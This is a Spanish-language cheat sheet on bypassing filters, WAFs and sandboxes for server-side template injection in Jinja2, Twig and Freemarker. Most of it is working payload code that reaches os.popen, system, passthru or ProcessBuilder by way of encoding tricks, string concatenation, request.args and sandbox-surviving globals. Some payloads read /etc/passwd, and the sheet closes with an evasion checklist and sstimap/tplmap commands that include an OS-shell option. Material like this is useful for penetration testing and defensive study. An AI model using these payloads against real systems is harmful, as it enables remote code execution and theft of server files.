# Bypass de Filtros y Sandboxes

Las aplicaciones intentan mitigar SSTI de varias formas:

```
1. Blacklist de palabras clave: bloquear "__class__", "os", "import", "system"...
2. Blacklist de caracteres: bloquear "_", ".", "[", "]", "'", "\""...
3. Sandboxing: Jinja2 SandboxedEnvironment, limitaciones del contexto
4. WAF: detectar patrones conocidos de SSTI
5. Longitud máxima del input
6. Encoding del output (no del input — no previene la evaluación)
```

### Bypass de filtros en Jinja2

#### 1. Bypass de filtro de guiones bajos (`_`)

```python
# Si '_' está bloqueado, usar attr() para acceder a atributos con doble guión bajo
{{''|attr('__class__')}}
{{''|attr('\x5f\x5fclass\x5f\x5f')}}      # hex encoding de __class__
{{''|attr('\x5f\x5fmro\x5f\x5f')}}

# Con request (Flask)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Via request.args para inyectar los nombres de atributos como parámetros
{{request|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)('os')|attr('popen')(request.args.cmd)|attr('read')()}}
# URL: ?x1=__class__&x2=__init__&x3=__globals__&cmd=id
# (los __ también se pasan por URL, no por el campo filtrado)
```

#### 2. Bypass de filtro de puntos (`.`)

```python
# attr() como alternativa al punto
{{''|attr('__class__')}}                    # en vez de ''.__class__
{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}

# Bracket notation
{{''['__class__']}}
{{''['__class__']['__mro__'][1]['__subclasses__']()}}

# Via |getattr filter (si existe custom filter)
```

#### 3. Bypass de filtro de comillas

```python
# Si ' y " están bloqueados
# Usar request.args para pasar strings
{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}
# URL: ?cmd=id  (el cmd se pasa por parámetro, no por el campo filtrado)

# Construir strings con chr() o similar
{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.chr(105)+cycler.__init__.__globals__.__builtins__.chr(100)).read()}}
# chr(105)=i, chr(100)=d → "id"

# Construir strings con ~ (concatenación en Jinja2)
{%set a='i'~'d'%}{{cycler.__init__.__globals__.os.popen(a).read()}}
```

#### 4. Bypass de filtro de corchetes (`[`, `]`)

```python
# Usar __getitem__ como método en lugar de []
{{''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(186).__init__.__globals__.__getitem__('os').popen('id').read()}}

# Via |last, |first, |list filtros de Jinja2
{{(''.__class__.__mro__|list)|last}}         # Último elemento = object
```

#### 5. Bypass de blacklist de palabras clave específicas

```python
# Palabra bloqueada: "os"
# Construir la string "os" dinámicamente
{%set x='o'+'s'%}{{cycler.__init__.__globals__[x].popen('id').read()}}
{%set x=['o','s']|join%}{{cycler.__init__.__globals__[x].popen('id').read()}}

# Via __dict__ para buscar 'os' sin mencionarlo
{{cycler.__init__.__globals__}}  # Ver si 'os' está en los globals
# Luego acceder por índice si se puede

# Palabra bloqueada: "popen"
{{cycler.__init__.__globals__.os['pop'+'en']('id').read()}}
{%set m='pop'+'en'%}{{cycler.__init__.__globals__.os[m]('id').read()}}

# Palabra bloqueada: "system"
{{cycler.__init__.__globals__.os['sys'+'tem']('id')}}

# Palabra bloqueada: "class"
{{''|attr('__cla'+'ss__')}}
{{''.__cla\ss__}}   # En algunos contextos el backslash se ignora
```

#### 6. Bypass de longitud máxima

```python
# Si hay un límite de N caracteres por input
# Almacenar partes en variables separadas (si hay múltiples campos)

# Usar cookies o parámetros para pasar el payload largo
{{cycler.__init__.__globals__.os.popen(request.cookies.cmd).read()}}
# Cookie: cmd=cat /etc/passwd

{{cycler.__init__.__globals__.os.popen(request.headers['X-CMD']).read()}}
# Header: X-CMD: cat /etc/passwd

# Aprovechar variables ya existentes en el template
# Si el template tiene: {% set user = current_user.name %}
# Y current_user.name es controlable → inyectar ahí
```

#### 7. Bypass de WAF mediante encoding

```python
# URL encoding del payload completo
%7B%7Bcycler.__init__.__globals__.os.popen('id').read()%7D%7D

# Double URL encoding
%257B%257Bcycler.__init__.__globals__.os.popen('id').read()%257D%257D

# Unicode normalization
{{cycler.\u005f\u005finit\u005f\u005f.__globals__.os.popen('id').read()}}
# \u005f = _

# Espacios alternativos (si los espacios están filtrados en el payload)
{{cycler.__init__.__globals__.os.popen('cat%09/etc/passwd').read()}}
# %09 = TAB

# Newlines como separadores
{{cycler.__init__.__globals__.os.popen('id\n').read()}}
```

### Bypass de Jinja2 SandboxedEnvironment

Cuando la app usa `jinja2.sandbox.SandboxedEnvironment` en lugar del `Environment` normal, muchos accesos a atributos peligrosos están bloqueados.

```python
# El sandbox bloquea acceso a:
# - __class__, __mro__, __subclasses__
# - __globals__, __builtins__
# - Atributos que empiezan por _ en general

# Bypass históricos (pueden estar parcheados en versiones modernas):

# CVE-2019-10906 — Jinja2 < 2.11.0
{{cycler.__init__.__globals__}}
# En SandboxedEnvironment, cycler no estaba bloqueado

# Via format_map (Python 3.6+)
{{'%s'.__class__.__mro__[1].__subclasses__()}}
# Algunas versiones del sandbox no bloqueaban __class__ en strings formateados

# Via lipsum (Jinja2 global, a veces no está en el sandbox)
{{lipsum.__globals__}}
{{lipsum.__globals__['os']}}
{{lipsum.__globals__['os'].popen('id').read()}}

# Via namespace object
{{namespace.__init__.__globals__}}

# Via Jinja2 internals (si el sandbox no bloquea acceso a internals)
{{request.environ}}
{{request.environ['werkzeug.server.shutdown']}}

# Sandbox bypass moderno (depende de la versión — verificar CVEs recientes)
# https://github.com/pallets/jinja/security/advisories
```

### Bypass de filtros en Twig

```php
# Filtro de "system" bloqueado:
{{_self.env.registerUndefinedFilterCallback("passthru")}}
{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("shell_exec")}}
{{_self.env.getFilter("id")}}

# Construir la string "system" dinámicamente si está bloqueada como literal
{%set f = "sys" ~ "tem"%}
{{_self.env.registerUndefinedFilterCallback(f)}}
{{_self.env.getFilter("id")}}

# Si registerUndefinedFilterCallback está bloqueado:
{{['id']|map('system')}}
{{['id']|map('passthru')}}
{{['id']|map('shell_exec')}}

# Construir la función dinámica:
{%set fn = "pas" ~ "sthru"%}
{{['id']|map(fn)}}
```

### Bypass de filtros en Freemarker

```java
// Blacklist de "Execute":
// Usar ObjectConstructor con ProcessBuilder en su lugar
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=ob("java.lang.ProcessBuilder",["id"])>
<#assign p=pb.start()>
<#assign is=p.getInputStream()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",is))>
${br.readLine()}

// Blacklist de "freemarker.template.utility":
// Construir el nombre de clase dinámicamente
<#assign classname = "freemarker" + ".template.utility.Execute">
<#assign ex=classname?new()>
${ex("id")}

// Via API de Java directamente (si ?api está habilitado)
${product?api.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}
```

### Técnicas de evasión de WAF

#### Fragmentar el payload en múltiples peticiones

```python
# Si el WAF detecta el payload completo pero no los fragmentos
# Usar parámetros de la app para construir el payload en el servidor

# Petición 1: establecer variable con primera parte
# Petición 2: establecer variable con segunda parte
# Petición 3: usar las variables combinadas

# En una sola petición con múltiples parámetros:
# ?part1=cycler.__init__&part2=.__globals__
# Template: {{ request.args.part1 | attr(request.args.part2) }}
```

#### Payload sin palabras clave reconocibles

```python
# Todo vía request.args para que el payload en sí no contenga nada sospechoso
{{(request|attr(request.args.a))|attr(request.args.b)|attr(request.args.c)(request.args.d)|attr(request.args.e)(request.args.f)|attr(request.args.g)()}}
# URL: ?a=application&b=__globals__&c=__getitem__&d=__builtins__&e=__getitem__&f=__import__&g=os -> faltan más pasos

# Más simple: pasar el comando via parámetro
{{cycler.__init__.__globals__.os.popen(request.args.c).read()}}
# URL: ?c=id  (solo "id" va como input, el payload base puede estar cacheado)
```

#### Newlines y comentarios para romper patrones

```python
# Jinja2 ignora whitespace entre tokens
{{
  cycler.
  __init__.
  __globals__.
  os.
  popen(
    'id'
  ).
  read()
}}

# Comentarios Jinja2 {# ... #} dentro del payload
{{cycler{#comment#}.__init__.__globals__.os.popen('id').read()}}

# Twig: comentarios {# #}
{{_self{# comment #}.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}
```

### Checklist de bypass

```
□ Probar |attr() en lugar de . para acceder a atributos con __
□ Probar [] (bracket notation) en lugar de .
□ Probar construir strings bloqueadas con concatenación ('sy'+'stem')
□ Probar pasar el comando via request.args para evitar detectar el payload
□ Probar pasar el payload vía header o cookie si el parámetro tiene filtro
□ Probar encoding: URL, hex, Unicode
□ Probar fragmentar el payload con whitespace/newlines/comentarios
□ Si el sandbox está activo: buscar CVEs de la versión específica del motor
□ Si cycler está bloqueado: probar lipsum, joiner, namespace, range
□ Si los globales están bloqueados: buscar objetos en el contexto del template
□ Probar variantes de funciones equivalentes (system, passthru, shell_exec, exec)
```

### Herramientas para bypass automático

```bash
# SSTImap — prueba automáticamente bypasses conocidos
python3 sstimap.py -u "https://target.com/?name=test" \
    --level 5 \           # Nivel máximo de evasión
    --cookie "session=TOKEN"

# tplmap — también tiene técnicas de evasión
python3 tplmap.py -u "https://target.com/?name=test" \
    --tpl-del "{{,}},{%,%}" \   # Especificar delimitadores si son custom
    --os-shell

# Burp Intruder con payloads de bypass
# Lista recomendada: PayloadsAllTheThings/Server Side Template Injection/
```

> La técnica más efectiva para bypassear filtros de palabras clave en Jinja2 es pasar el comando via `request.args`: el payload en el template puede estar en whitelist, y solo el argumento (inofensivo) va por el campo filtrado.

> Si el sandbox de Jinja2 está activo y bloquea `__class__`, siempre intentar `lipsum.__globals__` y `namespace.__init__.__globals__` — son globals de Jinja2 que históricamente han sobrevivido al sandbox.

> Los bypasses de sandbox son específicos de versión. Antes de descartar un SSTI como "no explotable por sandbox", verificar siempre la versión exacta del motor contra el CVE database — hay bypasses para casi todas las versiones.
